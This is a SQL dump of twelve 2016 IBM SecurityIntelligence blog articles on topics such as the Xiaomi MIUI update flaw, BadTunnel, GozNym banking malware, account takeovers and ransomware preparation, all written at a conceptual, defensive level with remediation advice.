INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (230, '3-D Printing Vulnerabilities: Build Your Own Breach?', 'Douglas Bonderud', '2016-7-8', 'Once reserved for large-scale manufacturing plants and educational institutions, 3-D printers are now going mainstream, with   predicting double-digit growth in shipments each year through 2020. But according to research from  , increased availability may also prompt a rise in 3-D printing vulnerabilities — is “build your own breach” the next big attack vector? While the consumer 3-D printing market lacks focus — relatively cheaper devices make it possible to print novelty items but don’t yet offer day-to-day benefits — business-driven solutions are enjoying widespread success. As noted by  , for example, companies have started experimenting with Hydra printers, which use multiple heads to create several objects simultaneously. Additionally,   reported that additive manufacturing company Sharebot recently released a high-speed professional digital light processing (DLP) printer, which is eight times faster than other DLP solutions. There’s also progress in education.   explained that companies such as XYZ Printing are now in the market with small, classroom-focused printer/scanner combinations that retail for less than $250. Manufacturers like Zortrax, meanwhile, have   with a large-scale M300 offering that can print objects up to 300 millimeters cubed. Even 3-D-printed food is on the rise. According to  , NASA has tasked a Texas startup with creating printed pizza for long space flights. With progress, however, comes price. If 3-D printers can print anything with the right blueprint, then it’s possible to create both dangerous items, such as weapon parts, or steal corporate secrets by snapping photos of physical security devices, extrapolating those pictures into CAD files and then making multiple copies. Sure, it sounds farfetched — but it’s not. According to  , it all started with a 2014 story from   about TSA baggage handling. Part of the piece featured images of a master key used to open TSA-approved luggage locks if necessary. Cybercriminals did some digging and found more detailed images on the website of a company that worked with federal agencies to create and enforce travel security guidelines. Next, a security researcher and hacker named Steven Knuchel, who goes by the alias Xylitol, created CAD files out of these images and posted them on Github. Printing enthusiasts took up the torch and made multiple copies, which easily opened the supposedly secure luggage locks. More recently, in March 2016, researchers from the   discovered it was possible to reverse engineer items created by a 3-D printer using a smartphone to record the sounds made by the printer’s nozzle as it applied item layers. If malicious insiders or outside actors could make and leverage these recordings, companies could lose a competitive edge in the market, along with their intellectual property. Another possible attack avenue involves hacking internet-connected printers to introduce errors in design. This could slow production or completely sidetrack a new product launch. Because many printers share the same vulnerabilities as other IoT devices — which often amounts to a total lack of   since they’re not seen as an integral part of the network — there’s huge potential here for motivated attackers to create duplicates, corrupt the printing process or disrupt corporate plans. So how do companies defend against 3-D printing vulnerabilities? It starts with the understanding that sensitive data now extends beyond protected documents and spec sheets to include images. Assume that anything visible in a picture can be deconstructed, reconstituted as a CAD file and then recreated via a 3-D printer. This means that   with physical security devices such as keys or locks need to consider going dark while in transit so they don’t accidentally make private information public. When it comes to on-site 3-D printers, meanwhile, it’s a good idea to employ an air-gap strategy and keep them separate from both the internet at large and your internal network. In addition, you need to restrict access since attackers can leverage mobile or desktop microphones to copy and replicate printed objects. There’s big potential for the industrial side of 3-D printing, and while home units may not corner the market, they’re now readily available to at-home hobbyists and cybercriminals alike. With niche companies quickly spinning up to improve production speed, item size and even print consumable items, it’s no surprise that companies are jumping on board to print prototypes or streamline production. But 3-D printing vulnerabilities are pervasive: An image or audio recording is all it takes for cybercriminals to effectively build their own breach and access high-value data — all without  . Bottom line? 3-D printing demands a new dimension in IT security to safeguard intellectual property and physical devices.', '\'Internet of Things (IoT)\', \'Network Security\', \'Vulnerabilities\'', 'https://securityintelligence.com/3-d-printing-vulnerabilities-build-your-own-breach/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (231, 'Remote Code Execution in Xiaomi MIUI Analytics', 'Roee Hay', '2016-7-7', 'The IBM X-Force Application Security Research Team has discovered a remote code execution (RCE) vulnerability in MIUI, which we privately disclosed to Xiaomi in January. MIUI is the flavor of   (currently based on Android 6.0) developed by Xiaomi. While developed primarily for use on Xiaomi’s own devices, MIUI builds are freely available for numerous devices from other vendors. Xiaomi is currently the third-largest smartphone manufacturer in the world, behind Samsung and Apple, in terms of devices shipped. More than 70 million devices were delivered in 2015, and many millions of these may be impacted by this vulnerability. The vulnerability we discovered allows for a man-in-the-middle (MitM) attacker to execute arbitrary code as the highly privileged Android system user. It has been remediated by Xiaomi from MIUI Global Stable version 7.2, and IBM strongly recommended that users   as soon as possible to ensure they are not vulnerable. We would also like to commend Xiaomi’s security team for excellent incident response. Within days of disclosure, the vulnerability was confirmed and classified, and we were provided with details of when a fix would be delivered. IBM found a vulnerability that allowed an attacker to execute code on a target device via a MitM attack. This attack also involved code injection inside of the update framework. These attack vectors are not new and have been   in  . The vulnerability resides in the analytics package, which is present in various applications that come with MIUI. All applications with the analytics package are vulnerable to remote code execution via MitM. We identified at least four vulnerable applications in the MIUI developer Rom version 6.1.8, including the built-in browser app. These had differing sets of privileges and capabilities. An RCE vulnerability in any of these applications allows attacker-supplied code to run with the privileges of its host app. If a   was found to be running as the system user, a good portion of the Android’s user space would be compromised. IBM identified such an app running as the system user and being vulnerable to code injection, which we then managed to successfully exploit in our lab. The vulnerability itself is conceptually straightforward. The analytics package polls a RESTful web service periodically to determine whether there is an update available. The server responds with the following short JSON response: \n \n \n \n The response is parsed to determine whether the current version is less than the version advertised in the update response. If so, the Android application package (APK) referred to by the URL key is downloaded and extracted to the file system within the local application sandbox context. This code is then loaded by the host application and executed. The update transaction is performed over an insecure transport link such as HTTP. A MitM attack would allow a malicious user to inject a JSON response to force an update by replacing the URL and MD5 hash with those of a malicious APK containing arbitrary code. Since there is no cryptographic verification of the update code itself, the analytics package will replace itself with the attacker-supplied version via Android’s DexClassLoader mechanism. This class of vulnerability seems to be a recurring theme in the security community. To  , developers should take care to only transact code-related data over a verified, secure transport with certificate pinning such as TLS. Additionally, the code itself should be cryptographically signed and properly verified by the host application prior to execution. Furthermore, we believe that a discussion should take place as to whether any application should have the ability to execute unsigned code via DexClassLoader, dynamic library injection or any other method on the Android platform. The recurring incidents of what are essentially identical bugs might indicate that the platform should consider exerting a great level of control over such activities and change the default policy to block these actions.', '\'Android\', \'Android Security\', \'Application Security\', \'Man-in-the-Middle (MitM)\', \'Remote Code Execution (RCE)\', \'Vulnerabilities\'', 'https://securityintelligence.com/remote-code-execution-in-xiaomi-miui-analytics/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (232, 'Account Takeovers: They Can Happen to Anyone', 'Lyndon Sutherland', '2016-7-5', 'Over the last few weeks there have been some very large data dumps made public, with the data from past   and Myspace breaches perhaps being the most notable. Due to the allegedly weak encryption used to protect the data, there is also concern that credentials from the Myspace dump in particular could be used in phishing attempts and attempts to log in to accounts on other popular services such as Facebook and Twitter. While the data is aged, it is quite possible that some users may not have changed their passwords within the last three years. Reports recently surfaced describing the takeover of some very high-profile users’ social media accounts, including Facebook CEO Mark Zuckerberg, singer Katy Perry, reality star Kylie Jenner and Twitter founder Evan Williams. Other notable Twitter accounts also recently compromised include those of the NFL and rapper Drake,   reported. Whether these account takeovers are related to user details from the dumps is unknown. The group allegedly   of the Zuckerberg and Williams account hacks goes by the name of OurMine. The group has been associated with the account takeovers of popular YouTube posters. According to a report from  , in 2015 the group was responsible for a series of distributed denial-of-service (DDoS) attacks against financial institutions, with the largest attack clocking in at some 117 Gbps. When we checked the OurMine Twitter account after the Zuckerberg takeover, it had been suspended, but the Google cache version showed almost 50,000 followers. A cached copy of that account also revealed the group claimed to have access to some of Bill Gates’ accounts. The attackers appear to have created a backup account in May 2016, which they used when conducting their next wave of cyberattacks. Through this Twitter profile, the   to have accessed accounts belonging to DJ and music producer David Guetta along with Evan Williams. This account has now also been suspended. According to  , the attackers first obtained access to Williams’ profile via his Foursquare account. The   reported that the site investigated reports of usernames and passwords being available on the Dark Web. In the post, the company stated it is confident usernames and passwords were not obtained through a breach but more likely is a collection of credentials obtained through breaches of other sites or possibly credential-stealing malware. Twitter checked the details obtained against user accounts, identifying at-risk accounts and others that had “direct password exposure.” These accounts were locked and required a password reset.  reported that some 32 million login credentials for the social media site are available on the Dark Web. Whether the username and password details for all accounts are accurate is another question, but it would seem apparent from the hacks and Twitter’s response that at least some of them are. You may wonder why the takeover of a social media account is important. What can the attackers do beyond post some rude or braggadocian tweets? In the case of the Katy Perry account takeover,   reported that those responsible uploaded one of her unreleased songs to the music hosting site SoundCloud. It’s not clear how these two incidents are related, but it’s possible that additional nefarious actions took place to obtain the song. A more serious example of what a   can lead to occurred in 2013, when the Twitter account of the Associated Press was taken over. A tweet from the compromised account claimed that there had been explosions at the White House and that the president had been injured. Since the AP is a verified account, the tweets were taken seriously and resulted in a sharp drop in the Dow Jones for a few minutes. The single tweet caused a   in the U.S. stock market. While the Dow recovered and the Twitter account was suspended, this incident demonstrates just what can happen. There’s also the potential for malware distribution via account compromise. For example, Kevin Bacon’s Twitter account was   and a link posted to his hundreds of thousands of followers, which sent them to a site that harvested their credentials. Obfuscated links in tweets, often using URL shorteners, can also send clickers to drive-by download sites to get infected with malware. Other potential consequences of account takeovers stem from password reuse.   is easy when you’re using the same login credentials between applications. Even if there are no serious consequences of a social media account takeover, explaining to friends that those nasty posts you made were the result of being hacked may not be totally believable; this has become the go-to answer when people wish to avoid responsibility for something they posted. Whatever the method being used by attackers to compromise accounts, there are some simple steps you can take to help keep your profiles safe and  . The most important step is also the easiest to implement. If you used the same email address for multiple services (i.e., for TeamViewer and Twitter), make absolutely sure that the password for each account is different. Keeping track of accounts and passwords can be a headache, so using a password manager to store those details makes sense. Make sure that it has a strong master password; the login credentials for that application would be very valuable to attackers, allowing them access to the details for every account stored in it. Other recommendations: Taking the steps outlined above can go a long way in helping you be confident that your voice remains your own in the world of social media.', '\'Credentials\', \'Hacking\', \'Password\', \'Social Media\', \'Social Media Security\', \'Twitter\'', 'https://securityintelligence.com/account-takeovers-they-can-happen-to-anyone/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (233, 'BadTunnel: Bad News?', 'Bryan Ivey', '2016-7-5', 'Researcher Yang Yu, director of Xuanwu Lab of Tencent in Beijing,   that a decades-old means of communication could be tweaked within the parameters of the protocol to hijack the targeted system. The attack relies on the means by which Windows resolves host names within uniform naming convention (UNC) or Uniform Resource Identifier (URI) syntax. The bug, dubbed BadTunnel, affects all versions of Microsoft Windows.   has not observed a notable increase in event count associated with this threat, but we will continue to watch for signs of attempted exploitation in the weeks to come. NetBIOS was created in 1983 as a protocol for two computers to communicate over a network. Microsoft later implemented NetBIOS as the basis for its Windows-to-Windows PC communication. In 1987, support for NetBIOS over TCP/IP was developed, which encapsulated the NetBIOS packets inside TCP and UDP packets. UNC was the initial manner of specifying access to a remote object, such as a Windows share or a file on a remote system. The syntax was of the form  . For example, if a user wanted to open a file (SomeFile.ext) on a local file server (LocalServer) in a share called PublicDocuments, it could be opened in an application using the name  . URI syntax became popular in the ’90s with the advent of the World Wide Web. Everyone these days has seen examples of URI syntax, but might not have realized it: For instance, a URI is http://www.securityintelligence.com. The full URI syntax is: \n To access the above document using URI syntax, the user would open  , where smb stands for Server Message Block, a protocol used to  , directories and printers between systems on a network. NetBIOS has its own name resolution service — the NetBIOS Name Service (NBNS) — to identify system names within the NetBIOS arena that might not be entered in a DNS environment. When opening a UNC or URI, the host name (in this case, LocalServer) is sent to the NBNS for resolution. Let’s look at how an innocent victim named Carol could be attacked by a cybercriminal named Ted. Ted would need to get Carol to open a malicious UNC or URI. This could be done in a number of ways — via a malicious webpage Carol visited, a specially crafted document, an unsolicited email or even from a USB drive. The UNC or URI has Ted’s system listed in the host name portion. As long as port 137/UDP is open between victim and attacker, Carol is at risk. Ted and Carol could be on the same corporate network or in the same coffee shop using the same wireless network. Ted’s system has ports 139 (NetBIOS Session Service) and 445 (Microsoft Directory Services) disabled on his system, but has port 137 (NetBIOS Name Service) open. His system is listening on the UDP port. Port 137 is used to query the network for the IP address of a given host name. If Carol’s system is trying to look up the local Web Proxy Auto-Discovery (WPAD) server to obtain a web proxy configuration file, Carol’s system will send out a NetBIOS name service query over port 137/UDP. The application listening on that port on Ted’s system would then reply back that his IP address is that host in a specially crafted NBNS response. Carol’s system will add the resolved address for Ted’s system to its NBT (NetBIOS over TCP/IP) cache. Ted’s system is now Carol’s web proxy, and all of her web-based traffic will flow through Ted’s system. Since it is the   executing the NetBIOS name resolution, any applications running on Windows that allow file names to be in a UNC or URI format, such as web browsers, Microsoft Office products and some third-party applications, may be used as the attack vector. Microsoft has patched this issue in its June release. We strongly suggest applying this update as soon as possible. We also encourage contacting your MSS provider to determine  . Yang Yu will be presenting his findings in a talk titled “ ” at Black Hat USA 2016. If you have an interest in NetBIOS and are attending Black Hat, you may wish to attend his session.', '\'Black Hat USA\', \'IBM Managed Security Services (MSS)\', \'Microsoft\', \'Vulnerability\', \'Windows\'', 'https://securityintelligence.com/badtunnel-bad-news/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (234, 'Security Glue: How Threat Intelligence Binds Security Providers and Partners', 'Pamela Cobb', '2016-6-28', 'The partner ecosystem is integral to any security provider to ensure maximum coverage for clients.  , TAXII and CybOX protocols provide the ability to communicate across multiple platforms, but of what benefit are these puzzle pieces without meaningful insights to cement the picture? A good shake would cause the whole thing to fall apart. That is where threat intelligence comes in. As threat intelligence generators pump out information, these insights and observables add context to the internal network landscape to prioritize risks and remediation plans. The base level of   data such as vulnerabilities, IP and URL reputation, spam reporting and malware are the tactical elements of data that flow from one system to the next. When an IP address is scanned and assessed to be at a high risk for hosting malware, this insight is funneled to a security intelligence solution and a flag is raised or a rule is created to block traffic from the network to this external address. When that IP is then associated with an MD5 hash for a specific malware file, another layer of insight is added to help direct specific action for the security operations center (SOC) analyst. So what can that analyst do in the event of mutating malware that regenerates as a new file? Higher-order intelligence speaks more to the tactics, techniques and practices that encompass the whole of a security event — the actors involved, campaigns and even specific similar incidents in other companies. If a particular malware campaign can be classified and its behavior identified and codified into observables, the insights can be applied to help make security decisions. How threat intelligence aggregators collect and disseminate this information varies, however. The best application is guided by the use of the aforementioned open standards. Much like knowing that wood glue is most useful for wood (shocking!) but not metal, and that two-part epoxies are good for just about everything else, the key comes down to labeling standards. Similarly, that’s how you can apply the query/response model for   and get interoperability between platforms. It’s all in the formatted labeling so you know exactly what you’re getting out of the threat intelligence. \n The scenario outlined above speaks to an SOC analyst, but that analyst could be in a stand-alone company or at a managed security services provider (MSSP) that provides monitoring for clients. The beauty of threat intelligence is that it can stick to many things; the usefulness of it becomes apparent in its application. The MSSP wants to help analysts speed their investigations and prioritize threats so that responders address the most severe issues first, increasing their overall efficiency. If you’d like to know more about the application of threat intelligence, check out the on-demand webinar “ .” To learn more about IBM X-Force’s specific threat intelligence offering, visit the   platform to sample threat intelligence at no charge.', '\'CybOX\', \'IBM X-Force Exchange\', \'Information Sharing\', \'STIX\', \'TAXII\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/security-glue-how-threat-intelligence-binds-security-providers-and-partners/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (235, 'Fool Me Once, Shame on You — Fool Me Eight Times, Shame on My Security Posture?', 'Michelle Alvarez', '2016-6-23', 'According to recent   data, 6 percent of the more than 1,100 companies with reported security incidents since 2011 were repeat offenders — that is, they experienced a security incident more than once in less than six years. Attack types associated with these security incidents included distributed denial-of-service (DDoS), brute-force and SQL injection attacks, as well as malware and phishing. During this period, at least one organization experienced a total of eight incidents — seven separate reported successful   against its website and one incident involving the compromise of customer accounts as a result of a brute-force attack on weak or reused passwords. Several of these repeat offenders are attractive to attackers because of their niche target audiences; they allow attackers to serve malicious content to a targeted browsing population. Operators of such websites may not be as focused on security as larger, more mainstream entities. Their weak security posture makes them a sitting duck for cybercriminals. According to X-Force data: Is your security posture to blame? Not necessarily. DDoS attacks can be mounted against any organization despite a strong security posture. Internet service providers and their partners aren’t always able to defend against a major DDoS attack. Attackers keep finding new DDoS techniques, so repeat victimization is almost expected. However, removal of these incidents from the equation still paints a concerning picture. Of the companies where more than one attack types was known, about half did not experience the same attack type. In other words, a targeted company may have experienced a SQL injection attack one year and a DDoS attack with an element of extortion the following. The main takeaway here? History doesn’t always repeat itself. Design a   for the future that not only incorporates lessons learned from past breaches, but also reduces risk from multiple attack vectors and protects critical assets.', '\'Brute-Force Attack\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'IBM X-Force Research\', \'SQL Injection\', \'X-Force\'', 'https://securityintelligence.com/fool-me-once-shame-on-you-fool-me-eight-times-shame-on-my-security-posture/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (236, 'GozNym: Living in America', 'Limor Kessem', '2016-6-22', 'IBM X-Force researchers who study cybercrime threats and malware configurations report that the GozNym banking malware, a   in early April, is expanding the reach of its nefarious redirection attacks to the U.S. Not two months after setting up and launching  , GozNym’s operators are testing those out on four of the largest banks in the U.S. Unsurprisingly for GozNym, the attackers are focusing the malware’s configuration on business banking services. The list of redirection targets appears limited at this time, but past cases such as   campaigns prove that these attacks often begin with a few targets and then expand. The overall idea behind redirection attacks is to hijack malware-infected users to a website that looks exactly like their bank’s site and having them log into their account in a completely unprotected environment. The victim’s credentials are stolen on the fake site in real time, tested against the bank’s genuine home page and used to initiate a fraudulent money transfer out of the account. Moreover, the victim is kept on the fake website, where the attacker can push social engineering notifications to them, making them divulge personally identifiable information (PII) and two-factor authentication elements. It’s important to note that the bank’s website is not being compromised in any way; rather, the victim is redirected from it immediately. The fake sites are perfect replicas, hosted on servers the cybercriminals control. They also present the correct URL in the address bar and even show the bank’s SSL certificate on the top bar. The latter is a technical trick programmed to pull the certificate from the genuine website to the fake one. Take   and Dridex for example: The redirection capability was a major differentiator for these two gangs. In Dyre’s case, it resulted in the threat claiming the top position as 2015’s most aggressive malware by attack volume, according to IBM Trusteer data. For Dridex, redirection attacks contributed to its climb from the rank of fifth in 2015 to the second-most aggressive banking malware in the first half of 2016. Redirection attacks are not considered to be a technically complicated task, but they are clever and require ample resources to set up. This is also why redirection attacks are not deployed by all financial malware operators; rather, they are the domain of organized cybercrime. Redirection attacks are often associated with the resources and capabilities of organized cybergangs that have developers on the team because extra setup and site maintenance is required to pull it off. The only two groups that launch regular redirection attacks nowadays are GozNym and crews that operate the Dridex banking Trojan. Dridex uses redirection attacks against U.K. and U.S. banks. Although redirection schemes have already been effectively implemented in real-world attacks, the team behind the GozNym hybrid built its own special scheme designed to keep the attacks hidden from prying security researchers’ eyes. GozNym’s redirection attacks share the same end goal as others like it: To prepare a successful redirection attack, GozNym has a two-stage process in place. At first, the malware redirects the victim to the fake site replica. It then masks the malicious webpage with a white overlay screen. The second part of the redirection is lifting the overlay and revealing the site replica to the infected user. IBM X-Force researchers believe the odd masking portion of the redirection attack is designed to keep the page looking harmless in an interim stage before it is presented to the victim. In most cases, GozNym redirects the bank’s home page, but that’s not the only page the malware can redirect. There are cases where other pages are redirected to GozNym’s replica to force the victim to enter their login credentials. IBM X-Force researchers believe that GozNym is an evolving malware project on the scale of other banking Trojans such as Neverquest and Dridex. The malware is quickly becoming a top global player, ranking fifth in the cybercrime arena for 2016 so far, according to attack volume data reported by IBM Security antifraud solutions. GozNym’s redirection attacks started off in Poland and spread to the U.S. within two months. We expect that the cybercrime gang will add more bank targets to the redirection configuration, likely after an initial testing period. IBM X-Force Research will be updating information and indicators of compromise on   via the  . Join XFE today to keep up to date about this threat and other findings from our cybercrime labs. The MD5 hashes are 20D6FE2353F3044D25D4FDC9F2872F39 and E17A79A6F7C8FE7F920DAD8CBCEE3DF0. IBM Security has studied the GozNym malware and its various attack schemes. Our research can help banks and targeted organizations learn more about this high-risk threat and the best mitigation techniques. Banks and service providers can start by using adaptive   and   with malware intelligence, which provides real-time insight into fraudster techniques and capabilities Users looking to prevent malware infections on their endpoints must keep their operating system up to date at all times, update frequently used programs and delete those they no longer use. Since GozNym and banking malware like it are usually delivered as email attachments, it is critically important is to never click on links or attachments in unsolicited email.', '\'Advanced Threats\', \'Banking Trojan\', \'GozNym\', \'IBM X-Force Research\', \'Malware\', \'Online Banking\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/goznym-launches-redirection-in-the-united-states/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (237, 'Ransomware: An Ounce of Prevention Is Worth a Pound of Cure', 'Robert Lelewski', '2016-6-17', 'An old axiom attributed to Benjamin Franklin, “an ounce of prevention is worth a pound of cure,” is perfectly applicable to a threat unfathomable in his time: ransomware. Recently   released its “Ransomware Response Guide.” This guide was created due to the continued evolution of the malware. Ransomware has not discriminated: There have been several high-profile examples of hospitals and government agencies essentially being held hostage for bitcoin payments after ransomware has encrypted business-critical files. At the same time, ransomware has also plagued the average home user by encrypting family photos and other sentimentally valuable information. When you read the “ ,” you’ll notice that a large portion of the document is devoted to a key phase in incident response: preparation. To Mr. Franklin’s point, not preparing for ransomware with an ounce of effort will in most cases result in a pound of resources being used to recover from an infection. The X-Force Incident Response Services team witnesses this time and time again, and cannot emphasize enough the importance of implementing that ounce of prevention. Unfortunately, when our customers call, many times it’s all too apparent that simple preventative steps could have helped them avoid a ransomware infection entirely. If your organization does fall prey to an attack, the “Ransomware Response Guide” offers a number of important guidelines you can use as your organization runs through the   life cycle. The guide explores important issues relating to ransomware, including the identification of the type of malware. It also provides key steps, discusses understanding the root cause and covers various recovery options. The threat landscape is constantly changing. Types of ransomware, their technical makeup and the techniques used for their propagation that are en vogue today may drastically change tomorrow. This guide may not encompass the inevitable threats looming on the horizon. It does, however, lay a foundation for that ever-important ounce of prevention. Whether or not your organization has been  , the “Ransomware Response Guide” will help you develop new ideas to prepare for this common threat or assist you in validating that your organization is taking the right steps to prepare for this attack.', '\'Advanced Threats\', \'IBM X-Force Incident Response and Intelligence Services\', \'Malware\', \'Ransomware\', \'Threat Prevention\'', 'https://securityintelligence.com/ransomware-an-ounce-of-prevention-is-worth-a-pound-of-cure/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (238, 'Power Your Response With Incident Visualization', 'John Bruce', '2016-6-16', 'The Ponemon Institute’s annual “ ” study, released this week, served up a clear message: Damages from cyberattacks continue to climb, but organizations can stem these rising costs by preparing and supporting their incident response (IR) team, saving hundreds of thousands of dollars on average. It’s long been our mission to help organizations transform their IR capabilities, and we’ve done so through our innovative  . With our latest platform release, version 26, we’re delighted to launch Resilient Incident Visualization. Resilient Incident Visualization is an industry first. It leverages the simple fact that actually seeing connections between incidents in a way like never before can help security analysts zero in on concerted attacks and  . It’s a simple yet powerful concept successful in, and now adopted from, other business areas. Resilient Incident Visualization graphically displays multidimensional relationships between incident artifacts or indicators of compromise (IoCs) and incidents in an organization’s environment. Security analysts can: With Resilient Incident Visualization, a security analyst can instantly see that artifacts related to a malware incident (e.g., suspicious IP addresses, DNS names, malware hashes, etc.) have appeared in several past incidents. This suggests that these incidents are part of a bigger attack, and the platform provides direction on how to put an end to it. This latest innovation comes only a few months after Resilient Systems was  . It shows that we’re committed to continuously innovating and pushing this market forward to help our customers thrive in the face of today’s cyberthreats. As part of IBM Security, we can innovate faster and more significantly than ever before. In the end, Resilient Incident Visualization is a step change for incident response — making teams smarter and faster responders.', '\'Cost of a Data Breach\', \'Data Visualization\', \'Incident Response (IR)\', \'Resilient Systems\'', 'https://securityintelligence.com/power-your-response-with-incident-visualization/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (239, 'Uncovering Risk From SAP HANA Vulnerabilities Can Be Simple and Easy', 'Vikalp Paliwal', '2016-6-15', 'The latest reports about SAP HANA vulnerabilities reveal some critical vulnerabilities related to authentication, authorizations, patches and misconfigurations, which could make   a high risk for customers. If any of these known vulnerabilities are exploited, it could result in significant business loss to customers running SAP HANA in applications. Other consequences related to an exploit or data breach include failed compliance, brand reputation impact and declining customer trust resulting in churn. SAP HANA often runs an enterprise’s most mission-critical applications. However, these enterprises may not completely understand the risk that weakened security for SAP HANA can present. SAP HANA manages various enterprise resource planning, customer relationship management, supply chain, analytics and business intelligence systems. It stores most critical business, personal and financial data, which requires managing regulatory and compliance requirements such as PCI, PII, HIPAA, Sarbox and  . \n Research from the Ponemon Institute, titled “ ,” revealed a few key points about the systems: Because of the speed with which customers are deploying SAP HANA in hybrid deployment models, security is often neglected by database administrators (DBAs) and IT. But these customers need to understand the cost of the data stored in SAP HANA: Any misconfigurations or   can cost millions of dollars in failed compliance if exploited by attackers or rogue insiders. There are many known vulnerabilities related to configurations changes, system-level privileges and missing patches that are known to cybercriminals, who are trying to exploit them. We need an automated tool that can scan all SAP HANA instances, identify critical and sensitive data, and provide a comprehensive listing of all vulnerabilities such as missing patches, use of default configurations, inadequate  , subpar file permissions, poor file ownership and more. Security teams can then look at these results and understand the impact. There should be a way to provide details about how these vulnerabilities can be remediated. Remediation is the key; often, security teams and even DBAs do not know what should be done to remediate critical vulnerabilities. Though identification of vulnerabilities is just one piece of a big problem, detailed remediation recommendations are key to helping teams learn how to harden their SAP HANA databases and subsequently lock down the system from future exploits of known vulnerabilities.', '\'Database Security\', \'Ponemon Institute\', \'SAP\', \'Vulnerabilities\'', 'https://securityintelligence.com/uncovering-risk-from-sap-hana-vulnerabilities-can-be-simple-and-easy/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (240, 'Lessons Learned From 11 Years of Cost of Data Breach Research', 'Larry Ponemon', '2016-6-15', 'Today, I am pleased to announce the release of the 2016 Cost of Data Breach report in partnership with IBM Security. Every year, we report on the findings from our survey of organizations worldwide — this year in 383 companies across 16 industries and in 12 different countries. In the global report published today, you will learn how our study quantifies the economic impacts of data breaches and observes cost trends over time. Our goal in this annual research is to help people understand the  . Over the many years of studying the data breach experiences of more than 2,000 organizations, the research has revealed the following seven megatrends:', '\'Cost of a Data Breach\', \'Data Breach\', \'Ponemon Institute\', \'Security Intelligence\'', 'https://securityintelligence.com/cost-of-a-data-breach-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (241, 'Does the Security Industry Have an Immune System Problem?', 'Glen Gooding', '2016-6-14', 'By definition, an immune system is the network of biological structures and processes within an organism that protect it against disease. A weak immune system that cannot effectively fight off attacks is not just a threat to its host, but also to others surrounding it. This concept can likewise be applied to cybersecurity: Organizations need to build a strong   in which various parts interact and work together to detect, prevent and eradicate breaches. To be effective, this immune system approach needs to operate at two levels, both internally in the organization and externally at a broader industry level. Across the world, cyberattacks are becoming more intelligent, more regular and more coordinated. A UN study on cybercrime established that up to   are driven by highly organized crime rings that share data and tools to launch sophisticated attacks on businesses across the globe. This is where organizations need to not only identify current threats, but anticipate them before they happen and take preventive measures to avoid being breached. Think of it like regularly taking vitamins to support your health: Building a strong internal network that is resilient to sickness is far more effective than responding to an infection when it happens. \n To effectively stave off cyberthreats in this manner, organizations need to have an integrated end-to-end security operation and incident response system in place. The challenge often faced is the number of variables that need to be standardized. Businesses need to bring together security analytics, forensics and vulnerability management alongside incident response into a coordinated approach for enterprise threat protection, detection and reaction. This level of defense is often difficult to achieve, particularly in organizations that don’t have specific departments or staff dedicated to security. As an example, ransomware aimed at the Australian  , and more specifically at small suburban medical and dental centers, has been a prominent threat that our incident response team has been working on in recent months. While internal security systems are crucial, there is a much bigger and far more powerful external problem: collaboration. External assistance is often used to provide support in health care, whether in the form of doctors, specialists or medical associations. Intelligence on diseases and their associated treatments are shared quickly after testing, leading to preventative measures such as immunization being taken to eliminate the risk of the disease spreading. Collaboration on cybersecurity can help businesses stay on the front foot as opposed to remaining reactive to threats. Indeed, plans for threat sharing centers were outlined in the  , indicating the local importance of collaboration. It was promising to see in the recent   that over 50 percent of CEOs agree collaboration is necessary to combat cybercrime. The progression of open approaches, community development and code sharing are steps in the right direction. However, only one-third of CEOs expressed willingness to share their organization’s cybersecurity incident information externally. This appears to be at odds with the broader technology sector, which is clearly benefiting from collaboration. According to a recent Linux Foundation study,   said that collaborative development practices have benefited their organization through shorter product development cycles and faster time to market. The security industry is lagging when it comes to embracing an open approach. Open collaboration is critical for the evolution of security technology; for example, the   enables the security community to easily create and share apps. By opening up a 700 TB database of threat intelligence data to the public, the X-Force Exchange allows companies across the world to share real-time data on threats and leverage each other’s expertise while remaining anonymous. In some ways, security still feels like something dealt with in dark corners. A major hurdle standing in the way of a   appears to be trust; fear of IP violations and the threat of leaking valuable company information is a major deterrent for businesses. The tools and the market are ready, but the suspicious nature of companies, coupled with the ingrained attitude that cybersecurity is more responsive than preventative, is hindering organizations from taking part in security collaborations. It may be some time before cybersecurity receives the same benefits from collaborative approaches seen in the wider tech industry. But collaboration can work. Let’s lift the lid on security and make it everyone’s problem.', '\'Data Breach\', \'IBM X-Force Exchange\', \'Incident Response (IR)\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/does-the-security-industry-have-an-immune-system-problem/');
